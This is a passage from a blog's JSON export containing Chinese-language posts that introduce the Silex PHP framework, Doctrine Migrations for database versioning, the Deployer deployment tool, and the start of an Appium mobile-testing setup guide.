Silex是我最喜欢的PHP开发框架之一(不，我现在更喜欢Laravel系列了)。其优点在于他既能够允许你不浪费时间构建任何项目结构，仅用3行代码启动一个超轻量级的应用，同时也支持你以十分优雅的方式，将各种优秀的第三方组件以极低的成本加入到Silex中，使之能胜任企业级应用的开发。\\n\\nSilex与Symfony、Twig、Pimple等著名PHP开源项目一样也是SensioLabs家族中的一员，Silex建立在Symfony生态圈的基础之上，你可以很方便地将Symfony的各种组件安插在Silex上，这也是我在[Slim](http://www.slimframework.com/)(另一款优秀的PHP微型框架)和Silex中最终选择后者的主要原因。基本上，你可以把Silex当作一个迷你版的Symfony。Silex的学习成本非常低，只用花半个小时通读一遍[Silex官方文档](http://silex.sensiolabs.org/doc/usage.html)你就能大概了解Silex的基本使用方法。微型框架的重点就在于要够简单，和Slim一样，用Silex你也可以在3行代码之内启动你的应用，下面是一个 Hello World 的例子：\\n\\n![Silex Hello World](/content/images/2015/05/silex.PNG)\\n\\n\\n在Silex的设计中，各种第三方库可以以[Service Provider](http://silex.sensiolabs.org/doc/providers.html)的方式被组织起来，为Silex提供更强大的功能支持，也能便于开发者更轻易的将这些Provider复用在新的项目上。Silex中已经为一些优秀的第三方库定义好了现成的Provider，例如：[Doctrine](http://www.doctrine-project.org/)，[Twig](http://twig.sensiolabs.org/)，Symfony Security 等，要使用它们，你要做的只是将这些现成的Provider（在）注册到应用中即可。\\n\\n![Silex Provider](/content/images/2015/05/silex-provider.PNG)\\n\\n另外，Silex内置的Pimple也为框架的依赖注入提供了方便的实现方案。\\n\\n喜欢TDD吗？没问题！Silex同样为[测试](http://silex.sensiolabs.org/doc/testing.html)提供了非常友好的支持。在PHPUnit和Symfony Web Driver的帮助下，你可以很容易的在Silex项目中为你的代码编写一个个单元测试或者功能测试。\\n\\n最后，再分享一个我自己的[Silex MVC 项目骨架](https://github.com/chenxiaojing123/Silex-MVC-Skeleton)。在这个针对中型MVC应用设计的项目骨架中，除了有对Doctrine DBAL，Twig等组件的支持，还加入了对[PHPCI](https://www.phptesting.org)、[Doctine Migrations](http://docs.doctrine-project.org/projects/doctrine-migrations/en/latest/) 及 [Silex Simple User](http://www.jasongrimes.org/2014/09/simple-user-management-in-silex/)的支持，以及对测试代码结构和命令行工具的设计。可以帮助希望用Silex开发MVC项目的开发者更快速高效的开始开发工作。\\n\\n\\n\\t\\tgit clone https://github.com/chenxiaojing123/Silex-MVC-Skeleton.git\\n        cd Silex-MVC-Skeleton/\\n        composer install\\n    \\nHere's an [Demo](http://silex.chxj.name/index_dev.php), and enjoy coding with Silex ~\\n    \\n![](/content/images/2015/05/logo-1.png)\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><!--kg-card-begin: markdown--><blockquote>\n<p>Silex是我最喜欢的PHP开发框架之一(不，我现在更喜欢Laravel系列了)。其优点在于他既能够允许你不浪费时间构建任何项目结构，仅用3行代码启动一个超轻量级的应用，同时也支持你以十分优雅的方式，将各种优秀的第三方组件以极低的成本加入到Silex中，使之能胜任企业级应用的开发。</p>\n</blockquote>\n<p>Silex与Symfony、Twig、Pimple等著名PHP开源项目一样也是SensioLabs家族中的一员，Silex建立在Symfony生态圈的基础之上，你可以很方便地将Symfony的各种组件安插在Silex上，这也是我在<a href=\"http://www.slimframework.com/\">Slim</a>(另一款优秀的PHP微型框架)和Silex中最终选择后者的主要原因。基本上，你可以把Silex当作一个迷你版的Symfony。Silex的学习成本非常低，只用花半个小时通读一遍<a href=\"http://silex.sensiolabs.org/doc/usage.html\">Silex官方文档</a>你就能大概了解Silex的基本使用方法。微型框架的重点就在于要够简单，和Slim一样，用Silex你也可以在3行代码之内启动你的应用，下面是一个 Hello World 的例子：</p>\n<p><img src=\"/content/images/2015/05/silex.PNG\" alt=\"Silex Hello World\"></p>\n<p>在Silex的设计中，各种第三方库可以以<a href=\"http://silex.sensiolabs.org/doc/providers.html\">Service Provider</a>的方式被组织起来，为Silex提供更强大的功能支持，也能便于开发者更轻易的将这些Provider复用在新的项目上。Silex中已经为一些优秀的第三方库定义好了现成的Provider，例如：<a href=\"http://www.doctrine-project.org/\">Doctrine</a>，<a href=\"http://twig.sensiolabs.org/\">Twig</a>，Symfony Security 等，要使用它们，你要做的只是将这些现成的Provider（在）注册到应用中即可。</p>\n<p><img src=\"/content/images/2015/05/silex-provider.PNG\" alt=\"Silex Provider\"></p>\n<p>另外，Silex内置的Pimple也为框架的依赖注入提供了方便的实现方案。</p>\n<p>喜欢TDD吗？没问题！Silex同样为<a href=\"http://silex.sensiolabs.org/doc/testing.html\">测试</a>提供了非常友好的支持。在PHPUnit和Symfony Web Driver的帮助下，你可以很容易的在Silex项目中为你的代码编写一个个单元测试或者功能测试。</p>\n<p>最后，再分享一个我自己的<a href=\"https://github.com/chenxiaojing123/Silex-MVC-Skeleton\">Silex MVC 项目骨架</a>。在这个针对中型MVC应用设计的项目骨架中，除了有对Doctrine DBAL，Twig等组件的支持，还加入了对<a href=\"https://www.phptesting.org\">PHPCI</a>、<a href=\"http://docs.doctrine-project.org/projects/doctrine-migrations/en/latest/\">Doctine Migrations</a> 及 <a href=\"http://www.jasongrimes.org/2014/09/simple-user-management-in-silex/\">Silex Simple User</a>的支持，以及对测试代码结构和命令行工具的设计。可以帮助希望用Silex开发MVC项目的开发者更快速高效的开始开发工作。</p>\n<pre><code>\tgit clone https://github.com/chenxiaojing123/Silex-MVC-Skeleton.git\n    cd Silex-MVC-Skeleton/\n    composer install\n</code></pre>\n<p>Here's an <a href=\"http://silex.chxj.name/index_dev.php\">Demo</a>, and enjoy coding with Silex ~</p>\n<p><img src=\"/content/images/2015/05/logo-1.png\" alt=\"\"></p>\n<!--kg-card-end: markdown--><!--kg-card-end: markdown-->","comment_id":"39","plaintext":"> Silex是我最喜欢的PHP开发框架之一(不，我现在更喜欢Laravel系列了)。其优点在于他既能够允许你不浪费时间构建任何项目结构，仅用3行代码启动一个超轻量级的应用，同时也支持你以十分优雅的方式，将各种优秀的第三方组件以极低的成本加入到Silex中，使之能胜任企业级应用的开发。\n\n\nSilex与Symfony、Twig、Pimple等著名PHP开源项目一样也是SensioLabs家族中的一员，Silex建立在Symfony生态圈的基础之上，你可以很方便地将Symfony的各种组件安插在Silex上，这也是我在\n\nSlim [http://www.slimframework.com/]\n(另一款优秀的PHP微型框架)和Silex中最终选择后者的主要原因。基本上，你可以把Silex当作一个迷你版的Symfony。Silex的学习成本非常低，只用花半个小时通读一遍\n\nSilex官方文档 [http://silex.sensiolabs.org/doc/usage.html]\n你就能大概了解Silex的基本使用方法。微型框架的重点就在于要够简单，和Slim一样，用Silex你也可以在3行代码之内启动你的应用，下面是一个 Hello\nWorld 的例子：\n\n\n\n在Silex的设计中，各种第三方库可以以Service Provider\n[http://silex.sensiolabs.org/doc/providers.html]\n的方式被组织起来，为Silex提供更强大的功能支持，也能便于开发者更轻易的将这些Provider复用在新的项目上。Silex中已经为一些优秀的第三方库定义好了现成的Provider，例如：\n\nDoctrine [http://www.doctrine-project.org/]，Twig [http://twig.sensiolabs.org/]\n，Symfony Security 等，要使用它们，你要做的只是将这些现成的Provider（在）注册到应用中即可。\n\n\n\n另外，Silex内置的Pimple也为框架的依赖注入提供了方便的实现方案。\n\n喜欢TDD吗？没问题！Silex同样为测试 [http://silex.sensiolabs.org/doc/testing.html]\n提供了非常友好的支持。在PHPUnit和Symfony Web Driver的帮助下，你可以很容易的在Silex项目中为你的代码编写一个个单元测试或者功能测试。\n\n最后，再分享一个我自己的Silex MVC 项目骨架\n[https://github.com/chenxiaojing123/Silex-MVC-Skeleton]\n。在这个针对中型MVC应用设计的项目骨架中，除了有对Doctrine DBAL，Twig等组件的支持，还加入了对PHPCI\n[https://www.phptesting.org]、Doctine Migrations\n[http://docs.doctrine-project.org/projects/doctrine-migrations/en/latest/]  及 \nSilex Simple User\n[http://www.jasongrimes.org/2014/09/simple-user-management-in-silex/]\n的支持，以及对测试代码结构和命令行工具的设计。可以帮助希望用Silex开发MVC项目的开发者更快速高效的开始开发工作。\n\n\tgit clone https://github.com/chenxiaojing123/Silex-MVC-Skeleton.git\n    cd Silex-MVC-Skeleton/\n    composer install\n\n\nHere's an Demo [http://silex.chxj.name/index_dev.php], and enjoy coding with\nSilex ~","feature_image":"http://blog.chxj.name/content/images/2015/05/silex.PNG","featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2015-04-22 06:36:52","updated_at":"2016-02-11 05:53:21","published_at":"2015-05-02 15:51:52","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null},{"id":"5cfa089b31767300013e0e6c","uuid":"c94731cc-578e-40bf-93d6-38e1168e927d","title":"还在随手修改数据表？！试试DB Migrations吧","slug":"doctrine-migrations","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"> 在项目迭代的过程中，数据库结构常常需要跟随业务需求的变化做出调整，尤其在迭代的初期阶段，加一个字段减一个字段的需求更是家常便饭。在小型团队中，往往是负责开发功能模块的程序员在完成本地开发环境数据库的变更后，直接到生产环境中更新数据库结构。\\n\\n这样的工作方式虽然看起来很轻松，但却可能给你的团队带来不小的麻烦。\\n\\n首先，是团队成员之间数据库环境的同步问题。为了使团队中的其他开发者及时了解数据库环境的变化，你不得不在每一次修改数据表结构后，都告知整个团队你对当前数据库所做的变更，并确保所有人正确更新了他们开发环境中的数据库。\\n\\n另外，变更数据库的程序员还需要同时对可能存在几个环境负责，如测试环境，项目展示环境（UAT）等都需要一一进行更新，靠人手动去维护成本高，速度慢，并且容易出错。在持续交付已经逐渐成为软件开发标准流程的今天，再继续这样的做法实在不够敏捷的。\\n\\n不过幸运的是，现在我们已经有了成熟的方案来应对这样的麻烦。既然我们可以通过版本控制的方式让代码同步变得更加轻松，那为什么我们不用同样的方式来管理数据库的变更呢？这就是 `Database Migrations`。下面我将以[`Doctrine Migrations`](http://docs.doctrine-project.org/projects/doctrine-migrations/en/latest/)为例，来说明我们应当如何解决这样的问题。\\n\\n+ 安装\\n\\n        composer require doctrine/migrations\\n        \\n Doctrine Migrations 提供了两种调用方式供你选择。一个是[注册命令行工具](http://docs.doctrine-project.org/projects/doctrine-migrations/en/latest/reference/introduction.html#register-console-commands), 另外，你也可以选择直接使用 [Doctrine Migrations可执行文件(.Phar)](http://docs.doctrine-project.org/projects/doctrine-migrations/en/latest/reference/introduction.html#php-binary-phar)， `migrations.phar` 默认会从当前目录下的 `migrations-db.php` 中读取数据库配置文件。\\n \\n  ![Doctrine Migrations](/content/images/2015/05/migrations.png) \\n\\n+ 常用命令\\n\\n        migrations：generate //生成变更脚本文件\\n        migrations：migrate  //更新到最新版本\\n        migrations：migrate prev  //回滚到前一个版本\\n        migrations：migrate YYYYMMDDHHMMSS  //更新到指定版本\\n        \\n 生成脚本的文件名格式为`Version+时间戳`，内容由 `up` 和 `down`两个方法组成，以便数据库可以在多个版本之间自由切换。另外， `Doctrine Migrations` 数据库操作的方法由 `Doctrine DBAL` 提供，详细用法查阅 [`Doctine DBAL`](http://docs.doctrine-project.org/projects/doctrine-dbal/en/latest/reference/schema-representation.html) 文档即可。\\n \\n  ![Doctrine Migrations File](/content/images/2015/05/migrations-file.png)\\n\\n \\n+ 实现原理\\n\\n执行 `migrations：generate` 时，`Doctrine Migrations` 会在当前环境的数据库中创建一张数据表用于保存当前数据库的版本。当执行 `\\tmigrations：migrate` 时， 工具会在其目录中查找是否有更新的脚本，如果有则执行它。\\n\\n最后，使用Migrations工具维护数据库版本最重要的一点在于 `永远不要手动修改数据库中的表结构`。其实在很多开发框架（如：Symfony，Laravel）中，都集成了DB Migrations工具，利用这样的工具，我们能够以脚本化的方式来管理数据库的变化，并且将这些变化纳入到代码版本控制中。当我们将新的代码同步到其他环境时，我们只需要在更新代码后执行Migration脚本，就能将这次提交内产生的数据库变换同步到当前环境中。甚至我们可能并不需要手动来执行这行命令，在发布项目后，项目构建工具会自动帮助我们执行命令，把数据库更新到最新的版本。\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><!--kg-card-begin: markdown--><blockquote>\n<p>在项目迭代的过程中，数据库结构常常需要跟随业务需求的变化做出调整，尤其在迭代的初期阶段，加一个字段减一个字段的需求更是家常便饭。在小型团队中，往往是负责开发功能模块的程序员在完成本地开发环境数据库的变更后，直接到生产环境中更新数据库结构。</p>\n</blockquote>\n<p>这样的工作方式虽然看起来很轻松，但却可能给你的团队带来不小的麻烦。</p>\n<p>首先，是团队成员之间数据库环境的同步问题。为了使团队中的其他开发者及时了解数据库环境的变化，你不得不在每一次修改数据表结构后，都告知整个团队你对当前数据库所做的变更，并确保所有人正确更新了他们开发环境中的数据库。</p>\n<p>另外，变更数据库的程序员还需要同时对可能存在几个环境负责，如测试环境，项目展示环境（UAT）等都需要一一进行更新，靠人手动去维护成本高，速度慢，并且容易出错。在持续交付已经逐渐成为软件开发标准流程的今天，再继续这样的做法实在不够敏捷的。</p>\n<p>不过幸运的是，现在我们已经有了成熟的方案来应对这样的麻烦。既然我们可以通过版本控制的方式让代码同步变得更加轻松，那为什么我们不用同样的方式来管理数据库的变更呢？这就是 <code>Database Migrations</code>。下面我将以<a href=\"http://docs.doctrine-project.org/projects/doctrine-migrations/en/latest/\"><code>Doctrine Migrations</code></a>为例，来说明我们应当如何解决这样的问题。</p>\n<ul>\n<li>\n<p>安装</p>\n<pre><code>  composer require doctrine/migrations\n</code></pre>\n</li>\n</ul>\n<p>Doctrine Migrations 提供了两种调用方式供你选择。一个是<a href=\"http://docs.doctrine-project.org/projects/doctrine-migrations/en/latest/reference/introduction.html#register-console-commands\">注册命令行工具</a>, 另外，你也可以选择直接使用 <a href=\"http://docs.doctrine-project.org/projects/doctrine-migrations/en/latest/reference/introduction.html#php-binary-phar\">Doctrine Migrations可执行文件(.Phar)</a>， <code>migrations.phar</code> 默认会从当前目录下的 <code>migrations-db.php</code> 中读取数据库配置文件。</p>\n<p><img src=\"/content/images/2015/05/migrations.png\" alt=\"Doctrine Migrations\"></p>\n<ul>\n<li>\n<p>常用命令</p>\n<pre><code>  migrations：generate //生成变更脚本文件\n  migrations：migrate  //更新到最新版本\n  migrations：migrate prev  //回滚到前一个版本\n  migrations：migrate YYYYMMDDHHMMSS  //更新到指定版本\n</code></pre>\n</li>\n</ul>\n<p>生成脚本的文件名格式为<code>Version+时间戳</code>，内容由 <code>up</code> 和 <code>down</code>两个方法组成，以便数据库可以在多个版本之间自由切换。另外， <code>Doctrine Migrations</code> 数据库操作的方法由 <code>Doctrine DBAL</code> 提供，详细用法查阅 <a href=\"http://docs.doctrine-project.org/projects/doctrine-dbal/en/latest/reference/schema-representation.html\"><code>Doctine DBAL</code></a> 文档即可。</p>\n<p><img src=\"/content/images/2015/05/migrations-file.png\" alt=\"Doctrine Migrations File\"></p>\n<ul>\n<li>实现原理</li>\n</ul>\n<p>执行 <code>migrations：generate</code> 时，<code>Doctrine Migrations</code> 会在当前环境的数据库中创建一张数据表用于保存当前数据库的版本。当执行 <code>migrations：migrate</code> 时， 工具会在其目录中查找是否有更新的脚本，如果有则执行它。</p>\n<p>最后，使用Migrations工具维护数据库版本最重要的一点在于 <code>永远不要手动修改数据库中的表结构</code>。其实在很多开发框架（如：Symfony，Laravel）中，都集成了DB Migrations工具，利用这样的工具，我们能够以脚本化的方式来管理数据库的变化，并且将这些变化纳入到代码版本控制中。当我们将新的代码同步到其他环境时，我们只需要在更新代码后执行Migration脚本，就能将这次提交内产生的数据库变换同步到当前环境中。甚至我们可能并不需要手动来执行这行命令，在发布项目后，项目构建工具会自动帮助我们执行命令，把数据库更新到最新的版本。</p>\n<!--kg-card-end: markdown--><!--kg-card-end: markdown-->","comment_id":"40","plaintext":"> 在项目迭代的过程中，数据库结构常常需要跟随业务需求的变化做出调整，尤其在迭代的初期阶段，加一个字段减一个字段的需求更是家常便饭。在小型团队中，往往是负责开发功能模块的程序员在完成本地开发环境数据库的变更后，直接到生产环境中更新数据库结构。\n\n\n这样的工作方式虽然看起来很轻松，但却可能给你的团队带来不小的麻烦。\n\n首先，是团队成员之间数据库环境的同步问题。为了使团队中的其他开发者及时了解数据库环境的变化，你不得不在每一次修改数据表结构后，都告知整个团队你对当前数据库所做的变更，并确保所有人正确更新了他们开发环境中的数据库。\n\n另外，变更数据库的程序员还需要同时对可能存在几个环境负责，如测试环境，项目展示环境（UAT）等都需要一一进行更新，靠人手动去维护成本高，速度慢，并且容易出错。在持续交付已经逐渐成为软件开发标准流程的今天，再继续这样的做法实在不够敏捷的。\n\n不过幸运的是，现在我们已经有了成熟的方案来应对这样的麻烦。既然我们可以通过版本控制的方式让代码同步变得更加轻松，那为什么我们不用同样的方式来管理数据库的变更呢？这就是\n Database Migrations。下面我将以Doctrine Migrations\n[http://docs.doctrine-project.org/projects/doctrine-migrations/en/latest/]\n为例，来说明我们应当如何解决这样的问题。\n\n * 安装\n   \n     composer require doctrine/migrations\n   \n   \n   \n\nDoctrine Migrations 提供了两种调用方式供你选择。一个是注册命令行工具\n[http://docs.doctrine-project.org/projects/doctrine-migrations/en/latest/reference/introduction.html#register-console-commands]\n, 另外，你也可以选择直接使用 Doctrine Migrations可执行文件(.Phar)\n[http://docs.doctrine-project.org/projects/doctrine-migrations/en/latest/reference/introduction.html#php-binary-phar]\n， migrations.phar  默认会从当前目录下的 migrations-db.php  中读取数据库配置文件。\n\n\n\n * 常用命令\n   \n     migrations：generate //生成变更脚本文件\n     migrations：migrate  //更新到最新版本\n     migrations：migrate prev  //回滚到前一个版本\n     migrations：migrate YYYYMMDDHHMMSS  //更新到指定版本\n   \n   \n   \n\n生成脚本的文件名格式为Version+时间戳，内容由 up  和 down两个方法组成，以便数据库可以在多个版本之间自由切换。另外， Doctrine\nMigrations  数据库操作的方法由 Doctrine DBAL  提供，详细用法查阅 Doctine DBAL\n[http://docs.doctrine-project.org/projects/doctrine-dbal/en/latest/reference/schema-representation.html] \n 文档即可。\n\n\n\n * 实现原理\n\n执行 migrations：generate  时，Doctrine Migrations \n会在当前环境的数据库中创建一张数据表用于保存当前数据库的版本。当执行 migrations：migrate  时，\n工具会在其目录中查找是否有更新的脚本，如果有则执行它。\n\n最后，使用Migrations工具维护数据库版本最重要的一点在于 永远不要手动修改数据库中的表结构\n。其实在很多开发框架（如：Symfony，Laravel）中，都集成了DB\nMigrations工具，利用这样的工具，我们能够以脚本化的方式来管理数据库的变化，并且将这些变化纳入到代码版本控制中。当我们将新的代码同步到其他环境时，我们只需要在更新代码后执行Migration脚本，就能将这次提交内产生的数据库变换同步到当前环境中。甚至我们可能并不需要手动来执行这行命令，在发布项目后，项目构建工具会自动帮助我们执行命令，把数据库更新到最新的版本。","feature_image":"/content/images/2015/05/migrations-1.png","featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2015-05-03 13:58:30","updated_at":"2016-02-12 07:26:31","published_at":"2015-05-22 08:28:02","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null},{"id":"5cfa089b31767300013e0e6d","uuid":"ee987ec2-5ca1-4d5a-8085-9667204c56a1","title":"PHP自动化发布工具：Deployer","slug":"php-deployment-tool-deployer","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"> 项目迭代的过程中, 不断把新开发的功能发布到不同的系统环境是一件家常便饭的工作. 传统的做法一般是: 登录到某台服务器上; 更新代码; 更新依赖(composer up); 重启一些服务(比如队列什么的)... 随着项目逐渐长大, 服务器的数量会越来越多, 每次发布新功能都需要亲自登录到20台服务器上, 一遍又一遍的做着重复的操作,还得确保每一次操作都正确且没有疏漏， 对于程序员来说, 这样的事情是不可想象的。重复的工作,就交给代码去完成吧!\\n\\n[Deployer](http://deployer.org/) 是一款用PHP开发的自动化发布工具。又要发布新版本了？ 你所要做的仅仅是在命令行中输入一行命令，执行预先写好的脚本，之后所有的工作deployer会帮你完成。甚至，你还可以把它和版本控制工具的Hook结合起来，例如，当master分支收到新的提交后，deployer自动从版本控制中拉去新的代码，并在指定服务器上完成后续的发布工作，自动化发布实现了!\\n\\n如果你是一名PHP程序员那就太棒了， 因为deployer的部署脚本也是用PHP来写的。deployer的原理其实很简单，添加服务器配置，通过ssh方式以秘钥或者密码登录到远程服务器并执行脚本。服务器配置文件大概是这样：\\n\\n    prod:\\n    host: domain.com\\n    user: www\\n    identity_file: ~\\n    stage: production\\n    deploy_path: /home/www/\\n\\n    prod.a:\\n    host: a.domain.com\\n    user: www\\n    identity_file: ~\\n    stage: production\\n    deploy_path: /home/www/  \\n    \\n然后你可以像这样编写一个任务, 没错，就是PHP的语法，你也可以在task里调用你自己写好的函数或者去捕获一个异常（Exception）：\\n\\n    task('update', function () {\\n        run(\\\"git pull && composer up\\\");\\n    });\\n\\n你可以在命令行中通过deployer执行任何一个任务：\\n   \\n    dep update production -vvv // production与配置文件的stage对应，表示在指定服务器上执行\\n    \\n另外， deployer 官方还提供了一些现成的 [菜谱（Recipes）](http://deployer.org/docs/recipes), 说白了就是一些针对指定框架写好的tasks，以便直接使用。对 `Laravel`，`Symfony` 等主流框架都是有支持的，如果在这些框架下，我们可以直接使用。不过就是没有，自己写一些任务也非常容易，因为其实deployer不过是通过PHP执行指定的shell命令。\\n\\n直接输入 `dep` 将会列出当前所有可执行的任务，供使用者参考，祝玩的开心。\\n\\n![depolyer](/content/images/2015/09/dep.png)\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><!--kg-card-begin: markdown--><blockquote>\n<p>项目迭代的过程中, 不断把新开发的功能发布到不同的系统环境是一件家常便饭的工作. 传统的做法一般是: 登录到某台服务器上; 更新代码; 更新依赖(composer up); 重启一些服务(比如队列什么的)... 随着项目逐渐长大, 服务器的数量会越来越多, 每次发布新功能都需要亲自登录到20台服务器上, 一遍又一遍的做着重复的操作,还得确保每一次操作都正确且没有疏漏， 对于程序员来说, 这样的事情是不可想象的。重复的工作,就交给代码去完成吧!</p>\n</blockquote>\n<p><a href=\"http://deployer.org/\">Deployer</a> 是一款用PHP开发的自动化发布工具。又要发布新版本了？ 你所要做的仅仅是在命令行中输入一行命令，执行预先写好的脚本，之后所有的工作deployer会帮你完成。甚至，你还可以把它和版本控制工具的Hook结合起来，例如，当master分支收到新的提交后，deployer自动从版本控制中拉去新的代码，并在指定服务器上完成后续的发布工作，自动化发布实现了!</p>\n<p>如果你是一名PHP程序员那就太棒了， 因为deployer的部署脚本也是用PHP来写的。deployer的原理其实很简单，添加服务器配置，通过ssh方式以秘钥或者密码登录到远程服务器并执行脚本。服务器配置文件大概是这样：</p>\n<pre><code>prod:\nhost: domain.com\nuser: www\nidentity_file: ~\nstage: production\ndeploy_path: /home/www/\n\nprod.a:\nhost: a.domain.com\nuser: www\nidentity_file: ~\nstage: production\ndeploy_path: /home/www/  \n</code></pre>\n<p>然后你可以像这样编写一个任务, 没错，就是PHP的语法，你也可以在task里调用你自己写好的函数或者去捕获一个异常（Exception）：</p>\n<pre><code>task('update', function () {\n    run(&quot;git pull &amp;&amp; composer up&quot;);\n});\n</code></pre>\n<p>你可以在命令行中通过deployer执行任何一个任务：</p>\n<pre><code>dep update production -vvv // production与配置文件的stage对应，表示在指定服务器上执行\n</code></pre>\n<p>另外， deployer 官方还提供了一些现成的 <a href=\"http://deployer.org/docs/recipes\">菜谱（Recipes）</a>, 说白了就是一些针对指定框架写好的tasks，以便直接使用。对 <code>Laravel</code>，<code>Symfony</code> 等主流框架都是有支持的，如果在这些框架下，我们可以直接使用。不过就是没有，自己写一些任务也非常容易，因为其实deployer不过是通过PHP执行指定的shell命令。</p>\n<p>直接输入 <code>dep</code> 将会列出当前所有可执行的任务，供使用者参考，祝玩的开心。</p>\n<p><img src=\"/content/images/2015/09/dep.png\" alt=\"depolyer\"></p>\n<!--kg-card-end: markdown--><!--kg-card-end: markdown-->","comment_id":"42","plaintext":"> 项目迭代的过程中, 不断把新开发的功能发布到不同的系统环境是一件家常便饭的工作. 传统的做法一般是: 登录到某台服务器上; 更新代码;\n更新依赖(composer up); 重启一些服务(比如队列什么的)... 随着项目逐渐长大, 服务器的数量会越来越多,\n每次发布新功能都需要亲自登录到20台服务器上, 一遍又一遍的做着重复的操作,还得确保每一次操作都正确且没有疏漏， 对于程序员来说,\n这样的事情是不可想象的。重复的工作,就交给代码去完成吧!\n\n\nDeployer [http://deployer.org/]  是一款用PHP开发的自动化发布工具。又要发布新版本了？\n你所要做的仅仅是在命令行中输入一行命令，执行预先写好的脚本，之后所有的工作deployer会帮你完成。甚至，你还可以把它和版本控制工具的Hook结合起来，例如，当master分支收到新的提交后，deployer自动从版本控制中拉去新的代码，并在指定服务器上完成后续的发布工作，自动化发布实现了!\n\n如果你是一名PHP程序员那就太棒了，\n因为deployer的部署脚本也是用PHP来写的。deployer的原理其实很简单，添加服务器配置，通过ssh方式以秘钥或者密码登录到远程服务器并执行脚本。服务器配置文件大概是这样：\n\nprod:\nhost: domain.com\nuser: www\nidentity_file: ~\nstage: production\ndeploy_path: /home/www/\n\nprod.a:\nhost: a.domain.com\nuser: www\nidentity_file: ~\nstage: production\ndeploy_path: /home/www/  \n\n\n然后你可以像这样编写一个任务, 没错，就是PHP的语法，你也可以在task里调用你自己写好的函数或者去捕获一个异常（Exception）：\n\ntask('update', function () {\n    run(\"git pull && composer up\");\n});\n\n\n你可以在命令行中通过deployer执行任何一个任务：\n\ndep update production -vvv // production与配置文件的stage对应，表示在指定服务器上执行\n\n\n另外， deployer 官方还提供了一些现成的 菜谱（Recipes） [http://deployer.org/docs/recipes],\n说白了就是一些针对指定框架写好的tasks，以便直接使用。对 Laravel，Symfony \n等主流框架都是有支持的，如果在这些框架下，我们可以直接使用。不过就是没有，自己写一些任务也非常容易，因为其实deployer不过是通过PHP执行指定的shell命令。\n\n直接输入 dep  将会列出当前所有可执行的任务，供使用者参考，祝玩的开心。","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":"PHP自动化发布工具：Deployer","meta_description":"自动化 项目发布 部署 PHP Deployer","author_id":"1","created_at":"2015-08-12 11:54:54","updated_at":"2016-02-11 06:03:32","published_at":"2015-09-05 12:21:51","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null},{"id":"5cfa089b31767300013e0e6e","uuid":"e373bc0b-8f5d-45ac-ac6c-427b78bd9fbc","title":"Appium：移动端自动化测试之道","slug":"appium-automated-testing","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"> 如果你曾接触过Selenium的话, 那么, Appium就是一个移动端的 Selenium, Appium通过调用Andriod SDK提供的API实现对应用的操作, 从而实现对各种功能的模拟测试.\\n\\nAndroid Test with [Appium](http://appium.io) （written with [python client](https://github.com/appium/python-client)）\\n\\n###### 环境准备(Android)\\n\\n* Windows\\n\\n        1. 安装JAVA: 可从官网获取JDK1.8安装包\\n        2. 安装ANDROID SDK MANAGER: 可从官网获取ANDROID SDK MANAGER安装包, 并配置环境变量 ANDROID_HOME 到 ANDROID SDK 安装目录, 如：D:\\\\Program Files\\\\Android\\\\android-sdk\\n        3. 通过ANDROID SDK MANAGER安装所需的版本的ANDROID SDK\\n        4. 安装appium:  可从[官网](http://appium.io/)获取\\n        5. （可选）建议安装新版nodejs: appium自带10.x.x版nodejs, 建议自行从官网安装新版\\n      \\n安装完成后可通过Appium安装目录下 `Appium\\\\node_modules\\\\.bin\\\\appium-doctor` 检查appium环境是否正确安装\\n\\n更详细的说明可以阅读官方文档：[在windows上运行appium](http://appium.io/slate/cn/v1.4.5/?python#在windows上运行appium)\\n\\n* Linux\\n       \\n        1. 安装JAVA: 略\\n        2. 安装ANDROID SDK MANAGER: [可从官网获取](http://developer.android.com/sdk/index.html), 可能要翻墙。 添加环境变量ANDROID_HOME\\n        3. 通过ANDROID SDK MANAGER安装所需的版本的ANDROID SDK\\n        4. 安装Appium：npm -g install appium, 很慢且不稳定， 建议翻墙，大约100M\\n        5. 安装nodejs: 建议从官网获取新版本(https://nodejs.org/)\\n\\n安装完成后可通过 `appium-doctor` 检查appium环境是否正确安装\\n\\n更详细的说明可以阅读官方文档：[在Linux上运行Appium](http://appium.io/slate/cn/v1.4.5/?python#在-linux-上运行-appium)\\n\\n###### 开发工具\\n\\n本项目采用了 [Appium Python Client](https://github.com/appium/python-client) 作为开发包，所以请安装python 2.* 及所需的IDE, 强力推荐 JetBrains 家的 [PyCharm](http://www.jetbrains.com/pycharm/)\\n       \\n项目测试框架为 [pytest](http://pytest.org/latest/) 及 [unittest](https://docs.python.org/2/library/unittest.html), 具体用法可参考官方文档\\n\\n###### 启动项目 \\n\\n    1. 连接设备（真机或模拟器）, `adb devices` 能看到设备即表示成功，Windows下通过豌豆荚等手机助手连接是最简单的方式\\n    2. 启动appium服务, Linux:`appium` \\\\ Windows: 打开appium，设置Device Name，启动服务\\n    3. 运行测试， 命令行 py.test test.py 执行，或在IDE中运行测试（PyCharm Ctrl+Shift+F10）。\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><!--kg-card-begin: 